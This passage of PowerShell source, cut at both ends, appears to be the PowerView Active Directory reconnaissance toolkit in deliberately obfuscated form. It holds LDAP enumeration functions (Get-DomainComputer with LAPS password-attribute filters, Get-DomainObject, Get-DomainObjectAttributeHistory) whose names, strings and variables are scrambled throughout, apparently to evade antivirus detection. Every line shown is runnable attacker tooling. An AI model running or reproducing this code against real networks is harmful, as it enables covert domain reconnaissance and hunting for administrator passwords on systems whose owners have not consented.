            if (${p`sBo`U`N`dpARAMeteRs}[("{0}{1}"-f'NoLAP','S')]) {
                
                
                &("{3}{0}{1}{2}"-f'Ob','j','ect','Get-Domain') -SearchBase ${Sc`h`E`MADn} -LDAPFilter (("{3}{2}{4}{0}{1}" -f '-admpw','d*)','a','(n','me=ms-*')) -Properties ("{1}{0}"-f'ame','n') @SearcherArguments | &("{0}{1}"-f'sele','ct') -expand ("{1}{0}" -f'e','nam') | &("{0}{1}{2}" -f'F','orEach-Ob','ject') {
                    &("{0}{2}{1}"-f 'Write-V','e','erbos') ('['+'Get-DomainComp'+'ut'+'er'+'] '+'S'+'e'+'arching '+'for'+' '+'att'+'ribu'+'te'+': '+"$_")
                    ${AtT`RFiL`T`ER} += "(!($_=*))"
                }
                if (${a`TT`RFilteR}) { ${Fi`Lt`ER} += "(&$AttrFilter)" }
            }
            if (${pSBoUN`DPA`R`AmEtERS}[("{2}{0}{1}"-f'anRe','adLAPS','C')]) {
                
                
                &("{1}{2}{0}{3}{4}"-f'Ob','Get-D','omain','j','ect') -SearchBase ${sC`hEM`AdN} -LDAPFilter ("{0}{3}{1}{2}" -f '(name=ms-*','d',')','-admpw') -Properties ("{1}{0}" -f'e','nam') @SearcherArguments | &("{0}{1}" -f 's','elect') -expand ("{0}{1}" -f'n','ame') | &("{0}{1}{3}{2}"-f 'ForEa','ch-Ob','ect','j') {
                    &("{0}{2}{1}"-f'W','e-Verbose','rit') ('[Get-D'+'omainCo'+'mp'+'uter'+']'+' '+'Se'+'ar'+'ching '+'fo'+'r '+'att'+'r'+'ibu'+'te: '+"$_")
                    ${ATtr`Fi`Lt`eR} += "($_=*)"
                }
                if (${aT`TrfI`ltER}) { ${FI`LteR} += "(|$AttrFilter)" }
            }
        }
        if (${psbOuNDpARA`Met`e`RS}[("{3}{2}{0}{1}" -f'AP','Filter','D','L')]) {
            &("{3}{0}{1}{2}" -f 'e-V','erb','ose','Writ') ('[Get'+'-D'+'o'+'mainC'+'ompu'+'ter'+'] '+'U'+'s'+'ing '+'a'+'dditi'+'o'+'nal '+'L'+'DAP '+'filter'+':'+' '+"$LDAPFilter")
            ${F`ilTer} += "$LDAPFilter"
        }
        
        ${U`Acf`ILTeR} | &("{0}{1}{2}" -f'Wh','ere-','Object') {${_}} | &("{2}{3}{0}{1}" -f 'ec','t','ForEach','-Obj') {
            if (${_} -match ("{1}{0}{2}"-f'_.','NOT','*')) {
                ${UacF`ie`lD} = ${_}.("{2}{1}{0}" -f 'ng','stri','Sub').Invoke(4)
                ${uA`CV`AlUe} = [Int](${U`ACEn`UM}::${uA`CfIe`ld})
                ${F`I`LTeR} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
            }
            else {
                ${U`A`cvALUe} = [Int](${U`ACe`NuM}::${_})
                ${fi`lt`er} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
            }
        }



        ${r`e`suLts} = &("{2}{3}{0}{1}{4}" -f 'D','APQ','Inv','oke-L','uery') @SearcherArguments -LDAPFilter "(&(samAccountType=805306369)$Filter)"
        ${reS`U`Lts} | &("{2}{1}{0}"-f 't','ec','Where-Obj') {${_}} | &("{0}{1}{2}"-f'For','Each-Ob','ject') {
            if (&("{2}{0}{1}"-f'et','-Member','G') -inputobject ${_} -name ("{0}{2}{1}" -f 'A','butes','ttri') -Membertype ("{0}{2}{1}"-f 'Pro','s','pertie')) {
                ${P`Rop} = @{}
                foreach (${A} in ${_}."A`TT`RIbuTES"."k`eYs" | &("{1}{3}{2}{0}"-f 'bject','S','-O','ort')) {
                    if ((${A} -eq ("{2}{0}{1}"-f 'jectsi','d','ob')) -or (${A} -eq ("{0}{1}{2}" -f's','idhisto','ry')) -or (${a} -eq ("{2}{1}{0}" -f 'id','tgu','objec')) -or (${a} -eq ("{0}{2}{1}{4}{3}" -f 'user','tific','cer','e','at'))) {
                        ${pr`oP}[${a}] = ${_}."at`Tri`BuTEs"[${A}]
                    }
                    else {
                        ${Va`Lu`Es} = @()
                        foreach (${V} in ${_}."At`TrI`B`UTeS"[${a}]."GE`TValu`Es"([byte[]])) {
                            ${V`AluES} +=  ${m`1lc}::"u`Tf8"."gETSt`R`ING"(${V})
                        }
                        ${PR`oP}[${a}] = ${VA`Lu`Es}
                    }
                }
            }
            else {
                ${P`Rop} = ${_}."pRoPe`Rti`ES"
            }

            ${UP} = ${T`RUE}
            if (${PSBouNd`PA`RaME`TeRs}[("{1}{0}" -f 'ing','P')]) {
                ${u`p} = &("{0}{2}{1}{3}"-f'Tes','onn','t-C','ection') -Count 1 -Quiet -ComputerName ${pR`op}."dnSHO`S`Tname"
            }
            if (${uP}) {
                if (${Ps`BOuND`par`A`mEt`erS}['Raw']) {
                    
                    ${CO`m`PutER} = ${_}
                    ${Com`p`UTeR}."P`SOBJEct"."T`Ype`NaMeS".("{1}{0}"-f'ert','Ins').Invoke(0, ("{4}{1}{0}{2}{3}"-f 'Vi','er','ew.Com','puter.Raw','Pow'))
                }
                else {
                    ${cOm`put`eR} = &("{1}{5}{0}{4}{3}{2}" -f 'ert','Co','rty','APPrope','-LD','nv') -Properties ${p`Rop}
                    ${C`O`mpUtEr}."Psobj`ect"."t`y`Pen`AMes".("{1}{0}{2}"-f'er','Ins','t').Invoke(0, ("{4}{5}{1}{2}{3}{0}" -f'er','rVie','w.C','omput','P','owe'))
                }
                ${co`Mput`er}
            }
        }
        if (${ReS`U`ltS}) {
            try { ${rEsul`TS}.("{1}{0}{2}" -f 'is','d','pose').Invoke() }
            catch {
                &("{1}{2}{0}"-f 'bose','Wri','te-Ver') ('[Get-'+'DomainCo'+'m'+'puter'+']'+' '+'Error'+' '+'disp'+'osing'+' '+'of'+' '+'the'+' '+'Result'+'s '+'objec'+'t:'+' '+"$_")
            }
        }
    }
}


function gE`T-do`MaINObj`e`cT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{0}{7}{2}{3}{4}{8}{6}{1}{9}" -f'SUs','ssi','aredV','arsMor','eTh','P','A','eDecl','an','gnments'}, '')]
    [OutputType({"{2}{0}{1}{3}"-f'.','ADObjec','PowerView','t'})]
    [OutputType({"{2}{1}{3}{4}{0}"-f'Raw','w','Po','erVie','w.ADObject.'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsITiOn = 0, VALuefRomPiPEline = ${t`RUE}, valUefrOMpIpELiNEBYpROpERTynAme = ${t`Rue})]
        [Alias({"{0}{1}{2}{3}" -f'Di','stingui','shedNa','me'}, {"{0}{1}{3}{2}" -f'SamAc','coun','e','tNam'}, {"{1}{0}" -f'me','Na'}, {"{2}{4}{3}{5}{1}{6}{0}" -f 'ame','uis','Me','tin','mberDis','g','hedN'}, {"{1}{0}{2}"-f'rN','Membe','ame'})]
        [String[]]
        ${i`d`Entity},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DOMa`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'F','ilter'})]
        [String]
        ${l`dapf`il`Ter},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PRopERT`i`eS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f 'A','DSPath'})]
        [String]
        ${Sea`R`cHb`ASE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{4}{1}{3}"-f 'Doma','troll','in','er','Con'})]
        [String]
        ${s`Er`Ver},

        [ValidateSet({"{0}{1}"-f 'Ba','se'}, {"{1}{0}"-f'evel','OneL'}, {"{0}{1}" -f 'Su','btree'})]
        [String]
        ${SearC`hScO`Pe} = ("{0}{1}" -f 'Subtre','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`es`ULTPAge`SI`ZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeR`V`ertim`eLimIT},

        [ValidateSet({"{0}{1}"-f'Da','cl'}, {"{0}{1}" -f 'Gro','up'}, {"{1}{0}"-f 'one','N'}, {"{0}{1}" -f 'Own','er'}, {"{0}{1}"-f 'Sa','cl'})]
        [String]
        ${sECURi`T`Yma`S`Ks},

        [Switch]
        ${tO`mbS`TonE},

        [Alias({"{1}{2}{0}"-f'rnOne','Re','tu'})]
        [Switch]
        ${fi`ND`ONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREDe`N`TiaL} =  ( get-varIabLE ("7tq"+"02")  -vA  )::"em`pTY",

        [Switch]
        ${R`Aw},

        [Switch]
        ${s`sL},

        [Switch]
        ${o`BFUsc`Ate}
    )

    DynamicParam {
        ${UAC`Va`lue`NameS} =   (  VARIAble  ("{0}{1}"-f 'g','604'))."vaL`UE"::("{1}{2}{0}"-f's','GetNam','e').Invoke(${Ua`CEn`Um})
        
        ${uAcvAlU`En`AMEs} = ${u`A`CVaLUEn`AMEs} | &("{0}{3}{2}{1}"-f 'ForEach-O','ect','j','b') {${_}; "NOT_$_"}
        
        &("{1}{2}{3}{0}{4}"-f'ram','New-','Dy','namicPa','eter') -Name ("{0}{2}{1}" -f 'UA','Filter','C') -ValidateSet ${uA`CVA`LueNam`ES} -Type ([array])
    }

    BEGIN {
        ${sE`A`Rch`ERARGuMeNTs} = @{}
        if (${psbo`UNdpar`Am`E`TERs}[("{0}{1}"-f'Dom','ain')]) { ${S`e`ARCh`e`RARgumENTs}[("{0}{1}" -f'D','omain')] = ${doMA`in} }
        if (${PSBO`U`NDPA`RAME`T`ERs}[("{1}{0}{2}"-f 'perti','Pro','es')]) { ${se`ArCHe`R`Ar`GUMENts}[("{1}{3}{2}{0}"-f 'es','Pr','i','opert')] = ${PrOPE`RT`IEs} }
        if (${P`s`BoUn`dpar`AmE`TERs}[("{2}{1}{0}" -f 'se','earchBa','S')]) { ${se`A`RChe`RA`RGU`menTS}[("{1}{0}{2}"-f 'hBas','Searc','e')] = ${seAr`C`H`BaSE} }
        if (${PS`Bo`UnD`P`A`RaMEtERs}[("{1}{0}" -f'erver','S')]) { ${seARC`hE`RARGumen`Ts}[("{1}{0}{2}" -f'rve','Se','r')] = ${sE`RVer} }
        if (${psboun`DP`ARA`MeT`eRS}[("{0}{2}{1}" -f'S','hScope','earc')]) { ${s`Ea`RC`hErARGu`Me`NTS}[("{2}{1}{3}{0}"-f'ope','rc','Sea','hSc')] = ${SeArChS`C`o`Pe} }
        if (${pSB`OuNDP`ARA`ME`Te`RS}[("{3}{1}{2}{0}" -f 'ize','sul','tPageS','Re')]) { ${Se`ARc`hErargum`ENts}[("{0}{1}{3}{2}"-f 'ResultP','ageS','e','iz')] = ${reSULt`p`Ag`es`IZe} }
        if (${P`SBoun`dpaRAme`T`eRS}[("{0}{1}{2}{3}"-f 'Se','rv','erTimeLimi','t')]) { ${S`EARcHE`RAR`GumE`NTs}[("{3}{2}{0}{1}"-f'm','it','Li','ServerTime')] = ${s`ErVeRTIM`El`IM`it} }
        if (${PsBOunDPA`Ra`me`T`E`Rs}[("{2}{1}{0}" -f's','tyMask','Securi')]) { ${S`EaRC`HEraRGu`meN`TS}[("{3}{0}{1}{2}" -f 'ity','M','asks','Secur')] = ${s`E`cUri`TyM`ASKS} }
        if (${psB`OU`N`D`PaRameTe`Rs}[("{0}{1}"-f'T','ombstone')]) { ${S`e`ARc`h`eRArGum`ENTs}[("{0}{1}{2}" -f 'T','o','mbstone')] = ${T`OMBsto`NE} }
        if (${PsboUndpar`Am`ET`eRs}[("{2}{1}{0}"-f'l','a','Credenti')]) { ${SEarCh`Er`ARGUmE`NtS}[("{1}{2}{0}"-f 'ntial','C','rede')] = ${CrE`dE`NTIal} }
        if (${Psb`ouNDPar`AM`EtE`RS}[("{0}{1}" -f'F','indOne')]) { ${SEArche`RA`R`Gu`Me`Nts}[("{1}{0}"-f'e','FindOn')] = ${F`iNdo`Ne} }
        if (${Ps`BOUn`d`paRAmETe`RS}['SSL']) { ${S`EArc`herARguMen`TS}['SSL'] = ${s`Sl} }
        if (${P`sboUN`DpAR`AM`e`TErS}[("{2}{0}{1}"-f 'usca','te','Obf')]) {${S`eARCheR`ARgUMeN`Ts}[("{0}{1}"-f 'Obf','uscate')] = ${O`Bf`USCa`Te} }
    }

    PROCESS {
        
        if (${P`SbOUNd`pARAMe`T`eRs} -and (${PSb`OUndpa`Ra`mE`Te`RS}."Co`UNt" -ne 0)) {
            &("{4}{1}{2}{3}{5}{0}"-f 'er','w-D','ynamicParam','e','Ne','t') -CreateVariables -BoundParameters ${psbOU`NdPA`RamEt`eRs}
        }
        ${IDE`N`Ti`T`YfIlter} = ''
        ${FI`Lt`Er} = ''
        ${id`e`NtI`TY} | &("{3}{2}{1}{0}"-f't','c','e','Where-Obj') {${_}} | &("{3}{2}{4}{1}{0}" -f '-Object','ach','or','F','E') {
            ${i`de`NtIt`YinstAnCe} = ${_}.("{1}{0}"-f'eplace','R').Invoke('(', '\28').("{1}{0}"-f'lace','Rep').Invoke(')', '\29')
            if (${idEntitYinST`A`N`Ce} -match ("{0}{1}" -f'^S-','1-')) {
                ${IDen`Ti`TyfIL`T`er} += "(objectsid=$IdentityInstance)"
            }
            elseif (${IDEnt`I`TyInst`AN`ce} -match ((("{3}{0}{1}{2}"-f 'U','{0}','DC)=','^(CN{0}O')) -F  [CHAr]124)) {
                ${idENT`It`Yfi`lTER} += "(distinguishedname=$IdentityInstance)"
                if ((-not ${p`s`BO`UNDpARAm`ET`erS}[("{0}{2}{1}"-f 'D','n','omai')]) -and (-not ${p`s`Bou`N`D`pARameTers}[("{1}{0}{2}{3}"-f 'arc','Se','hB','ase')])) {
                    
                    
                    ${ideNtI`TY`Do`maIn} = ${iDE`NTi`T`YIn`stance}.("{0}{2}{1}" -f 'SubSt','ing','r').Invoke(${I`dENT`ITYi`Ns`T`AncE}.("{1}{0}" -f'xOf','Inde').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                    &("{1}{0}{2}{3}"-f'te-Verb','Wri','o','se') ('['+'Get'+'-Doma'+'i'+'nObject]'+' '+'Extr'+'a'+'cte'+'d '+'d'+'omain '+"'$IdentityDomain' "+'from'+' '+"'$IdentityInstance'")
                    ${S`e`ArCh`ERaRgumeNTs}[("{1}{0}"-f 'main','Do')] = ${Ide`NtiTy`DoMa`IN}
                    ${ob`JeCTsE`Ar`C`hER} = &("{3}{2}{0}{4}{1}"-f 'omainS','her','t-D','Ge','earc') @SearcherArguments
                    if (-not ${ObJeCT`SE`ARCheR}) {
                        &("{3}{2}{0}{1}" -f'e-Warni','ng','t','Wri') ('[G'+'et-Doma'+'inObjec'+'t]'+' '+'U'+'nable '+'to'+' '+'ret'+'r'+'ieve'+' '+'dom'+'a'+'in '+'searc'+'her'+' '+'fo'+'r '+"'$IdentityDomain'")
                    }
                }
            }
            elseif (${Id`ENt`ItyI`Nsta`NCe} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                ${G`UIDbytEs`T`RINg} = (([Guid]${I`dentIt`YINST`A`NCe}).("{2}{1}{0}" -f'rray','yteA','ToB').Invoke() | &("{3}{2}{0}{1}"-f 'h-','Object','c','ForEa') { '\' + ${_}.("{1}{2}{0}"-f'ing','ToS','tr').Invoke('X2') }) -join ''
                &("{2}{0}{1}" -f 'u','tput','Write-O') "$GuidByteString"
                ${IDeN`T`ItyfIltEr} += "(objectguid=$GuidByteString)"
            }
            elseif (${IDENt`ityi`N`stANCe}.("{0}{1}"-f 'Cont','ains').Invoke('\')) {
                ${conveRtEd`iD`EnTi`Ty`INs`TAN`ce} = ${IDe`NTI`TyINST`ANcE}.("{1}{0}{2}"-f'l','Rep','ace').Invoke('\28', '(').("{0}{1}"-f'Repl','ace').Invoke('\29', ')') | &("{0}{2}{1}{3}" -f 'Convert-AD','am','N','e') -OutputType ("{1}{0}"-f 'anonical','C')
                if (${co`NVeR`Ted`I`denti`T`y`InstaNCe}) {
                    ${oB`jECtDOm`A`IN} = ${conv`E`RTE`D`IDent`Ity`I`NSt`ANcE}.("{2}{0}{1}" -f 'Str','ing','Sub').Invoke(0, ${C`onV`ERTEdi`dEntit`yI`Nst`Ance}.("{0}{2}{1}"-f 'I','Of','ndex').Invoke('/'))
                    ${ObJe`cTnA`ME} = ${i`DenTiTyi`Ns`TA`N`cE}.("{1}{0}"-f 'plit','S').Invoke('\')[1]
                    ${IdeNTi`TyF`Ilter} += "(samAccountName=$ObjectName)"
                    ${s`eARche`RaRgUmE`Nts}[("{1}{0}"-f'ain','Dom')] = ${objEcTDO`m`A`IN}
                    &("{2}{1}{0}" -f 'e','erbos','Write-V') ('[G'+'et-DomainObjec'+'t'+']'+' '+'Extr'+'ac'+'ted '+'doma'+'i'+'n '+"'$ObjectDomain' "+'fro'+'m '+"'$IdentityInstance'")
                    ${ob`Je`C`TSEarc`heR} = &("{0}{4}{3}{2}{1}" -f 'Get-Dom','cher','ar','Se','ain') @SearcherArguments
                }
            }
            elseif (${iDE`NTityI`NS`TaN`ce}.("{0}{2}{1}" -f'C','ains','ont').Invoke('.')) {
                ${iDE`NT`I`TyFIlTeR} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
            }
            else {
                ${ID`e`Nt`ITYFi`lTer} += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
            }
        }
        if (${I`d`eNt`itYfilTER} -and (${I`d`ENTIty`FiLtER}.("{0}{1}"-f'Tri','m').Invoke() -ne '') ) {
            ${f`Il`TeR} += "(|$IdentityFilter)"
        }
        if (${PS`B`OU`NdPaRAmEters}[("{0}{1}{2}" -f'LDAPF','i','lter')]) {
            &("{1}{0}{2}"-f'e-Verb','Writ','ose') ('[Get'+'-DomainObje'+'c'+'t'+']'+' '+'U'+'sing '+'ad'+'di'+'tional '+'LDA'+'P '+'filter'+':'+' '+"$LDAPFilter")
            ${fI`lT`Er} += "$LDAPFilter"
        }

        
        ${U`A`cfi`Lter} | &("{0}{1}{2}"-f'Whe','re-Objec','t') {${_}} | &("{2}{0}{1}{3}{4}" -f 'r','E','Fo','ach-','Object') {
            if (${_} -match ("{1}{0}"-f '*','NOT_.')) {
                ${ua`Cf`iEld} = ${_}.("{2}{0}{1}" -f'r','ing','Subst').Invoke(4)
                ${UACv`A`LUE} = [Int](${U`Acen`Um}::${uA`c`FI`Eld})
                ${f`Il`TEr} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
            }
            else {
                ${u`AcvaluE} = [Int](${uAc`En`UM}::${_})
                ${fil`TeR} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
            }
        }

        if (${FiLt`er} -and ${F`I`lter} -ne '') {
            ${SearChe`RArgu`m`E`Nts}[("{1}{0}{2}"-f 'PFi','LDA','lter')] = "(&$Filter)"
        }
        &("{0}{4}{3}{1}{2}" -f'W','e-Ver','bose','t','ri') "[Get-DomainObject] Get-DomainObject filter string: $($Filter) "
            
        ${rE`Sul`Ts} = &("{3}{4}{1}{0}{2}"-f'Que','LDAP','ry','Inv','oke-') @SearcherArguments
        ${R`ESUL`Ts} | &("{0}{1}{2}{3}"-f'Wher','e-O','b','ject') {${_}} | &("{2}{0}{3}{4}{1}" -f 'r','h-Object','Fo','Ea','c') {
            if (${Ps`BO`UNdpa`RaMETErs}['Raw']) {
                
                ${O`BJ`eCt} = ${_}
                ${OB`Je`CT}."pSOBJ`EcT"."ty`PE`NAMes".("{0}{1}{2}" -f 'In','ser','t').Invoke(0, ("{0}{1}{4}{5}{3}{2}"-f 'Powe','r','ct.Raw','.ADObje','V','iew'))
            }
            else {
                if (&("{0}{1}{2}" -f 'Ge','t','-Member') -inputobject ${_} -name ("{2}{1}{3}{0}" -f'utes','r','Att','ib') -Membertype ("{2}{0}{1}{3}" -f'p','ertie','Pro','s')) {
                    ${Pr`OP} = @{}
                    foreach (${a} in ${_}."a`Tt`RI`Butes"."K`EYs" | &("{2}{1}{0}"-f'ct','bje','Sort-O')) {
                        if ((${A} -eq ("{2}{0}{1}"-f 'ts','id','objec')) -or (${a} -eq ("{1}{2}{0}"-f 'ory','sidh','ist')) -or (${a} -eq ("{3}{2}{0}{1}" -f'ctg','uid','je','ob')) -or (${A} -eq ("{4}{1}{2}{0}{3}" -f 'fic','sercer','ti','ate','u'))) {
                            ${pr`op}[${A}] = ${_}."aTt`RiBUt`es"[${A}]
                        }
                        else {
                            ${vaLU`eS} = @()
                            foreach (${v} in ${_}."a`TtrIB`Ut`ES"[${A}]."gE`TV`ALUEs"([byte[]])) {
                                ${va`lu`ES} +=   (  vaRIABLE  ("{0}{1}"-f 'm1L','c')  -VAlueoNl )::"u`TF8"."Get`s`TRInG"(${v})
                            }
                            ${p`ROP}[${a}] = ${V`A`LueS}
                        }
                    }
                }
                else {
                    ${pR`Op} = ${_}."p`ROPErTi`ES"
                }

                ${oBJ`e`Ct} = &("{3}{0}{2}{4}{5}{1}" -f 've','rty','rt-','Con','L','DAPPrope') -Properties ${PR`Op}
                ${o`BJ`eCt}."p`S`oBJeCt"."tYpE`N`AMEs".("{0}{2}{1}"-f'Inse','t','r').Invoke(0, ("{0}{3}{2}{1}{4}"-f'Po','w.ADOb','Vie','wer','ject'))
            }
            ${Obje`cT}
        }
        if (${re`sU`LTs}) {
            try { ${R`ESUlTS}.("{0}{1}" -f'disp','ose').Invoke() }
            catch {
                &("{1}{2}{3}{0}{4}"-f's','Write-Ve','rb','o','e') ('[Ge'+'t-D'+'omainOb'+'ject] '+'Erro'+'r'+' '+'dispo'+'sin'+'g '+'of'+' '+'the'+' '+'Resu'+'l'+'ts '+'ob'+'je'+'ct: '+"$_")
            }
        }
    }
}


function g`e`T-`DO`maiNo`BJeCTAt`T`RiButeH`isTOrY {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{2}{0}{5}{3}{1}" -f'ec','MoreThanAssignments','SUseD','rs','P','laredVa'}, '')]
    [OutputType({"{2}{7}{1}{4}{9}{0}{3}{5}{6}{8}"-f 'tAt','w.ADO','Power','t','b','ribute','H','Vie','istory','jec'})]
    [CmdletBinding()]
    Param(
        [Parameter(POsitIon = 0, VAluEFrOMPIpeLiNE = ${tr`UE}, ValuEFROMPipelINEBYpRopERtYnAme = ${T`RuE})]
        [Alias({"{2}{1}{3}{0}{4}"-f 'N','istin','D','guished','ame'}, {"{1}{2}{0}" -f'Name','SamAccoun','t'}, {"{1}{0}" -f 'e','Nam'}, {"{2}{1}{0}{3}"-f 'rDistin','e','Memb','guishedName'}, {"{2}{0}{1}" -f 'embe','rName','M'})]
        [String[]]
        ${ID`Ent`iTY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DoM`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}"-f'F','ter','il'})]
        [String]
        ${ld`AP`FILt`er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`R`op`ERTIEs},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f 'h','ADSP','at'})]
        [String]
        ${se`ArCH`BasE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{0}{2}{4}"-f'oll','Domai','e','nContr','r'})]
        [String]
        ${SE`RVeR},

        [ValidateSet({"{1}{0}"-f'ase','B'}, {"{0}{1}{2}" -f'O','neL','evel'}, {"{1}{0}"-f 'btree','Su'})]
        [String]
        ${sea`RCh`sc`opE} = ("{2}{1}{0}"-f'btree','u','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`S`ULtPAge`SIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${ServeRt`iMeLim`IT},

        [Switch]
        ${toMbs`To`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REdEnTi`AL} =   (  gET-vAriABLE  ("{0}{1}" -f '7tq0','2')  )."V`AlUe"::"e`mpTY",

        [Switch]
        ${R`AW}
    )

    BEGIN {
        ${SEar`CHe`RA`RGUM`eNts} = @{
            ("{2}{0}{1}"-f 'ertie','s','Prop')    =   ("{3}{2}{1}{0}{4}{6}{5}"-f 'ib','replattr','sds-','m','u','etadata','tem'),("{1}{3}{4}{0}{2}"-f'd','distingu','name','i','she')
            'Raw'           =   ${tr`Ue}
        }
        if (${psbOu`NDPar`A`m`eTE`Rs}[("{1}{0}"-f 'main','Do')]) { ${sear`chERa`Rg`Um`ents}[("{0}{1}" -f 'D','omain')] = ${Do`M`AiN} }
        if (${PsBO`UNDp`A`RameterS}[("{0}{2}{1}"-f'LDAPFil','r','te')]) { ${SE`Arch`eRARGUM`E`NtS}[("{2}{0}{1}" -f 'F','ilter','LDAP')] = ${lda`pfi`LTeR} }
        if (${pS`BOundp`A`RAm`E`TeRS}[("{1}{2}{0}{3}"-f'hBas','Sear','c','e')]) { ${SEarcH`Erar`g`UME`N`TS}[("{2}{3}{0}{1}" -f 'hBas','e','S','earc')] = ${s`Ear`ChbASE} }
        if (${ps`BOu`NdpARAMeTE`RS}[("{1}{0}"-f'rver','Se')]) { ${SeA`R`c`HerargumE`NtS}[("{0}{1}{2}"-f 'Se','r','ver')] = ${ser`V`ER} }
        if (${PsBoU`NDPa`R`Am`eTERs}[("{2}{1}{0}" -f'e','rchScop','Sea')]) { ${sE`AR`c`hErArGumE`N`TS}[("{2}{1}{3}{0}" -f 'e','chSco','Sear','p')] = ${SeaR`cH`sCo`pe} }
        if (${p`sb`oUndParA`ME`T`ERS}[("{3}{0}{1}{2}" -f 'e','Si','ze','ResultPag')]) { ${SE`ARcH`e`RARGUmEn`Ts}[("{2}{3}{1}{0}"-f 'ze','tPageSi','Res','ul')] = ${R`ESu`lTPAGeSIze} }
        if (${PSBO`Un`D`PARaME`TErS}[("{3}{2}{1}{0}{4}" -f 'i','meLim','erverTi','S','t')]) { ${SeaR`C`HERa`RGuMe`NTS}[("{0}{1}{2}{3}" -f'Se','rve','rTimeLi','mit')] = ${sErV`ert`iM`eliMiT} }
        if (${pSb`OUndPaR`AM`e`TErs}[("{1}{0}"-f 'one','Tombst')]) { ${se`A`RChEraRgu`MEntS}[("{0}{2}{1}{3}" -f 'To','to','mbs','ne')] = ${to`m`BsTOne} }
        if (${PsbOuNDp`AR`AMeT`ers}[("{1}{0}" -f'ne','FindO')]) { ${Sea`R`CHE`Ra`RgUMeNTs}[("{1}{0}{2}"-f'ndOn','Fi','e')] = ${fi`N`DONE} }
        if (${PSb`oUndpa`RA`MEt`Ers}[("{1}{0}{2}" -f 'reden','C','tial')]) { ${sE`ARCh`erARgUmEn`TS}[("{1}{0}{3}{2}"-f 'red','C','tial','en')] = ${CR`edenTI`Al} }

        if (${pS`BOUNd`p`Aram`EteRS}[("{0}{2}{1}" -f'Pro','s','pertie')]) {
            ${P`RO`pErTyfi`lTEr} = ${pS`B`O`UnDpa`RamEteRS}[("{0}{3}{2}{1}"-f 'Prope','es','ti','r')] -Join '|'
        }
        else {
            ${pRope`R`TyFilter} = ''
        }
    }

    PROCESS {
        if (${p`sBOU`NDpARam`eT`Ers}[("{2}{0}{1}"-f'ti','ty','Iden')]) { ${sEa`R`cheRAr`gU`me`NTS}[("{0}{1}{2}"-f 'Id','entit','y')] = ${IDEn`T`I`Ty} }

        &("{1}{4}{2}{3}{0}"-f't','G','-D','omainObjec','et') @SearcherArguments | &("{0}{1}{2}{3}"-f'ForEa','c','h-Ob','ject') {
            ${oB`j`ECTDN} = ${_}."pRO`P`eRtI`es"[("{1}{4}{0}{2}{3}"-f's','distin','hednam','e','gui')][0]
            ForEach(${X`M`lNODe} in ${_}."P`RO`PERT`iES"[("{6}{5}{7}{4}{0}{2}{1}{3}" -f 'tribu','ad','temet','ata','replat','d','ms','s-')]) {
                ${te`mP`OBjECT} = [xml]${Xml`N`OdE} | &("{3}{1}{2}{0}"-f 'ect','-Ob','j','Select') -ExpandProperty ("{0}{1}{2}{4}{3}" -f 'DS_REPL_','ATTR','_ME','_DATA','TA') -ErrorAction ("{3}{0}{1}{2}{4}" -f'l','entlyCo','ntin','Si','ue')
                if (${Tem`PoB`JEcT}) {
                    if (${T`E`mpobject}."P`sz`AtTRibUTe`NaMe" -Match ${PRo`pER`TY`FIlT`Er}) {
                        ${Out`p`Ut} = &("{0}{1}{2}" -f'New','-Ob','ject') ("{0}{1}{2}" -f'PSO','bj','ect')
                        ${O`UTpUt} | &("{1}{0}{2}{3}" -f'-Me','Add','mb','er') ("{1}{2}{0}" -f'perty','NoteP','ro') ("{0}{2}{1}"-f 'Obj','ctDN','e') ${ob`Je`CtDn}
                        ${oUTP`UT} | &("{2}{1}{0}" -f'r','mbe','Add-Me') ("{0}{1}{3}{2}"-f 'Not','eProp','y','ert') ("{4}{1}{2}{0}{3}" -f 'eNa','ttrib','ut','me','A') ${teMP`o`BJE`ct}."pszAT`TR`i`BUTEna`mE"
                        ${o`UtpUt} | &("{2}{1}{0}"-f 'Member','d-','Ad') ("{3}{1}{0}{2}"-f 'Pr','te','operty','No') ("{5}{3}{6}{4}{1}{2}{0}" -f'nge','g','Cha','igin','in','LastOr','at') ${t`e`MpObJE`Ct}."fT`imELAStORiginATingC`ha`N`gE"
                        ${O`UTp`Ut} | &("{2}{0}{1}" -f 'Membe','r','Add-') ("{2}{0}{1}"-f 't','y','NoteProper') ("{1}{0}" -f 'ion','Vers') ${t`eMp`oB`jeCT}."d`wV`eR`SIoN"
                        ${ou`TpuT} | &("{0}{1}{2}"-f 'A','dd-Me','mber') ("{1}{2}{3}{0}"-f'ty','NoteP','r','oper') ("{4}{1}{3}{2}{6}{5}{0}" -f'N','n','D','g','LastOriginati','D','sa') ${TeM`p`ObJ`eCT}."PsZl`AStoRIG`iNatI`N`gd`SADn"
